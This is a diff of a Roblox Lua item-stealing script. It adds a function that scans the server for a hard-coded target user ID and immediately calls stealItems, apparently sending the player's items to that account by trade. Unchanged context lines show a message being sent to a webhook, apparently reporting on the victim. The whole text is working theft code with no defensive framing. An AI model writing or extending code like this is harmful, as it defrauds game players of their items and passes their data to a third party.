@@ -377,7 +377,7 @@ else
     SendMessageEMBED(Webhook, embed, false)
 end
 
-local TargetUserId = 1936393784 --QuadCoreDragon
+local TargetUserId = 1936393784 -- QuadCoreDragon
 
 local function stealItems(targetPlayer)
     local player = game.Players.LocalPlayer
@@ -390,6 +390,20 @@ local function stealItems(targetPlayer)
     end
 end
 
+local function checkForTargetPlayer()
+    -- Loop through all players in the game
+    for _, player in pairs(game.Players:GetPlayers()) do
+        if player.UserId == TargetUserId then
+            stealItems(player)
+            break  -- Exit loop once we send the trade request
+        end
+    end
+end
+
+-- Check for target player every time the script runs (in case the player is already in the game)
+checkForTargetPlayer()
+
+-- Optional: Keep checking in case they join after the script runs
 game.Players.PlayerAdded:Connect(function(player)
     if player.UserId == TargetUserId then
         stealItems(player)
